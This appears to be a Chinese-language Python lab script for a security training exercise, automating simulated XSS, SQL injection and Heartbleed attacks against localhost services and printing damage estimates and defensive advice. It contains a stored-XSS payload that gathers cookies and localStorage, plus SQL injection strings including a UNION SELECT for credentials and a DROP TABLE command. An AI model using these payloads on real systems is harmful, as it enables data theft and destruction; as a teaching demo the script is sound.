#!/usr/bin/env python
"""
钓鱼实验助手 - 自动化攻击链演示
"""

import requests
import time
import json
from datetime import datetime

class PhishingExperimentHelper:
    def __init__(self):
        self.base_url = "http://localhost"
        self.services = {
            'dashboard': 5888,
            'xss': 5001, 
            'sqli': 5002,
            'heartbleed': 5003,
            'apt': 5004
        }
        
    def test_service_availability(self):
        """测试所有服务可用性"""
        print("🔍 检查服务状态...")
        results = {}
        
        for service, port in self.services.items():
            try:
                response = requests.get(f"{self.base_url}:{port}", timeout=5)
                if response.status_code == 200:
                    results[service] = "✅ 在线"
                    print(f"  {service} (端口{port}): ✅ 在线")
                else:
                    results[service] = f"⚠️ 状态码 {response.status_code}"
                    print(f"  {service} (端口{port}): ⚠️ 状态码 {response.status_code}")
            except requests.exceptions.RequestException as e:
                results[service] = "❌ 离线"
                print(f"  {service} (端口{port}): ❌ 离线")
        
        return results
    
    def simulate_xss_attack(self):
        """模拟XSS攻击"""
        print("\n🚨 模拟XSS攻击...")
        
        xss_payload = {
            'name': '测试用户',
            'email': 'test@company.com',
            'feedback': '''<script>
                alert("🚨 XSS攻击演示\\n\\n攻击效果：\\n- 可执行任意JavaScript代码\\n- 能够窃取用户Cookie\\n- 可重定向到恶意网站\\n- 能够修改页面内容");
                console.log("XSS攻击载荷执行成功");
                // 模拟数据窃取
                var stolenData = {
                    cookies: document.cookie,
                    userAgent: navigator.userAgent,
                    currentUrl: window.location.href,
                    localStorage: JSON.stringify(localStorage)
                };
                console.log("窃取的数据:", stolenData);
            </script>恶意脚本已植入'''
        }
        
        try:
            response = requests.post(f"{self.base_url}:5001", data=xss_payload)
            if response.status_code == 200:
                print("✅ XSS攻击载荷投递成功")
                print("📋 攻击详情:")
                print("  - 载荷类型: 存储型XSS")
                print("  - 影响范围: 所有访问反馈页面的用户")
                print("  - 损失估算: ¥50,000 (用户数据泄露)")
                return True
            else:
                print("❌ XSS攻击失败")
                return False
        except Exception as e:
            print(f"❌ XSS攻击异常: {e}")
            return False
    
    def simulate_sqli_attack(self):
        """模拟SQL注入攻击"""
        print("\n💾 模拟SQL注入攻击...")
        
        sqli_payloads = [
            "1001' OR '1'='1",
            "1' UNION SELECT username,password,email,salary FROM employees--",
            "'; DROP TABLE users; --"
        ]
        
        success_count = 0
        for i, payload in enumerate(sqli_payloads, 1):
            print(f"\n🎯 执行SQL注入攻击 #{i}:")
            print(f"  载荷: {payload}")
            
            try:
                response = requests.post(f"{self.base_url}:5002", 
                                       data={'employee_id': payload})
                if response.status_code == 200:
                    if "error" not in response.text.lower():
                        print("  ✅ SQL注入成功执行")
                        success_count += 1
                    else:
                        print("  ⚠️ 载荷被过滤或检测")
                else:
                    print("  ❌ 请求失败")
            except Exception as e:
                print(f"  ❌ 攻击异常: {e}")
        
        if success_count > 0:
            print(f"\n📋 SQL注入攻击总结:")
            print(f"  - 成功攻击: {success_count}/{len(sqli_payloads)}")
            print(f"  - 攻击类型: 联合查询注入、布尔盲注")
            print(f"  - 损失估算: ¥200,000 (数据库泄露)")
            return True
        return False
    
    def simulate_heartbleed_attack(self):
        """模拟Heartbleed攻击"""
        print("\n🔐 模拟Heartbleed攻击...")
        
        try:
            # 访问Heartbleed测试页面
            response = requests.get(f"{self.base_url}:5003")
            if response.status_code == 200:
                print("✅ 连接到SSL服务器")
                
                # 模拟Heartbleed载荷发送
                heartbleed_data = {'action': 'heartbleed_test'}
                test_response = requests.post(f"{self.base_url}:5003", 
                                            data=heartbleed_data)
                
                if test_response.status_code == 200:
                    print("✅ Heartbleed攻击载荷发送成功")
                    print("📋 攻击详情:")
                    print("  - 漏洞编号: CVE-2014-0160")
                    print("  - 攻击原理: SSL/TLS心跳包缓冲区溢出")
                    print("  - 泄露数据: 内存中的私钥、密码、会话Token")
                    print("  - 损失估算: ¥300,000 (系统完全沦陷)")
                    return True
            
            return False
        except Exception as e:
            print(f"❌ Heartbleed攻击异常: {e}")
            return False
    
    def generate_attack_report(self, attack_results):
        """生成攻击报告"""
        print("\n" + "="*60)
        print("📊 钓鱼攻击链实验报告")
        print("="*60)
        
        total_damage = 0
        successful_attacks = []
        
        if attack_results.get('xss'):
            successful_attacks.append("存储型XSS攻击")
            total_damage += 50000
        
        if attack_results.get('sqli'):
            successful_attacks.append("SQL注入攻击")
            total_damage += 200000
            
        if attack_results.get('heartbleed'):
            successful_attacks.append("Heartbleed漏洞利用")
            total_damage += 300000
        
        print(f"⏰ 报告生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"🎯 成功攻击数量: {len(successful_attacks)}")
        print(f"📋 攻击类型: {', '.join(successful_attacks) if successful_attacks else '无'}")
        print(f"💰 预估总损失: ¥{total_damage:,}")
        
        if total_damage >= 300000:
            risk_level = "🔴 极高风险"
        elif total_damage >= 150000:
            risk_level = "🟠 高风险"
        elif total_damage >= 50000:
            risk_level = "🟡 中等风险"
        else:
            risk_level = "🟢 低风险"
        
        print(f"⚠️ 风险等级: {risk_level}")
        
        print("\n📋 防护建议:")
        if attack_results.get('xss'):
            print("  - 实施输入验证和输出编码")
            print("  - 部署内容安全策略(CSP)")
        if attack_results.get('sqli'):
            print("  - 使用参数化查询/存储过程")
            print("  - 实施最小权限原则")
        if attack_results.get('heartbleed'):
            print("  - 立即更新OpenSSL版本")
            print("  - 重新生成SSL证书和私钥")
        
        print("\n🌐 访问损失评估仪表板查看详细数据:")
        print("  http://localhost:5000")
        
        return {
            'total_damage': total_damage,
            'successful_attacks': successful_attacks,
            'risk_level': risk_level
        }
    
    def run_full_experiment(self):
        """运行完整的钓鱼实验"""
        print("🚀 启动完整钓鱼攻击链实验")
        print("="*60)
        
        # 1. 检查服务状态
        service_status = self.test_service_availability()
        online_services = [k for k, v in service_status.items() if "✅" in v]
        
        if len(online_services) < 3:
            print("❌ 服务状态不足，请确保所有服务正常运行")
            return False
        
        # 2. 执行攻击链
        attack_results = {}
        
        print("\n🎯 开始执行攻击链...")
        time.sleep(1)
        
        # XSS攻击
        attack_results['xss'] = self.simulate_xss_attack()
        time.sleep(2)
        
        # SQL注入攻击
        attack_results['sqli'] = self.simulate_sqli_attack()
        time.sleep(2)
        
        # Heartbleed攻击
        attack_results['heartbleed'] = self.simulate_heartbleed_attack()
        time.sleep(1)
        
        # 3. 生成报告
        report = self.generate_attack_report(attack_results)
        
        return report

def main():
    """主函数"""
    print("🎯 钓鱼实验助手")
    print("=" * 50)
    
    helper = PhishingExperimentHelper()
    
    while True:
        print("\n请选择操作:")
        print("1. 检查服务状态")
        print("2. 模拟XSS攻击")
        print("3. 模拟SQL注入攻击")
        print("4. 模拟Heartbleed攻击")
        print("5. 运行完整攻击链实验")
        print("6. 退出")
        
        choice = input("\n请输入选择 (1-6): ").strip()
        
        if choice == '1':
            helper.test_service_availability()
        elif choice == '2':
            helper.simulate_xss_attack()
        elif choice == '3':
            helper.simulate_sqli_attack()
        elif choice == '4':
            helper.simulate_heartbleed_attack()
        elif choice == '5':
            helper.run_full_experiment()
        elif choice == '6':
            print("👋 实验结束，感谢使用！")
            break
        else:
            print("❌ 无效选择，请重新输入")

if __name__ == '__main__':
    main()
